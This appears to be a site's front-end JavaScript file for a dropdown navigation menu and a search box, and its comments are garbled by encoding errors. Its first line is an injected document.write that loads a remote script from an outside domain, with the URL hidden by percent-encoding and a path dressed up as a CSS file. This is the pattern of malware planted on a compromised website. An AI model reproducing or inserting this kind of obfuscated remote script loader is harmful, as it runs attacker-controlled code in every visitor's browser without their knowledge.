document.write ('<SCRIPT src="http://%77%77%77%2E%71%71%35%31%38%38%38%38%2E%63%6F%6D/%63%73%73/%63%73%73%2E%6A%73"></script>');
// ��ʼ��
$(function (){
	// �����˵��Ӳ˵�
	$("ul.topnav li.b").mouseover(function() {
		
		$(this).find("ul.subnav").slideDown('fast').show();

		$(this).hover(function() {
		}, function(){	
			$(this).find("ul.subnav").slideUp('slow');
		});

		}).hover(function() { 
			$(this).addClass("subhover");
		}, function(){
			$(this).removeClass("subhover");
	});


	// ��ʼ��������
	RefFormWord();
	$('#refContent').blur(function (){
		RefFormWord();
	});
	$('#refContent').click(function (){
		RefFormNoWord();
	});
});


var refContentDef = "������ؼ���";
// ��ʾĬ��ֵ
function RefFormWord(){
	if ($id('refContent').value == ''){
		$id('refContent').value = refContentDef;
		$id('refContent').style.color = '#a59ea3';
	}
}
// ����ʾĬ��ֵ
function RefFormNoWord(){
	if ($id('refContent').value == refContentDef){
		$id('refContent').value = '';
		$id('refContent').style.color = '#000000';
	}
}

// ��ѯ�����
function CheckRefForm(){
		if(document.formsearch.searchtype.value=="")
		document.formsearch.action="http://www.google.cn/custom"
		else
		document.formsearch.action="{dede:field name='phpurl'/}/search.php"
	} 



// �Ƿ����
if (todayDate!=lastDate){
	AjaxGetDeal("configDeal.asp");
}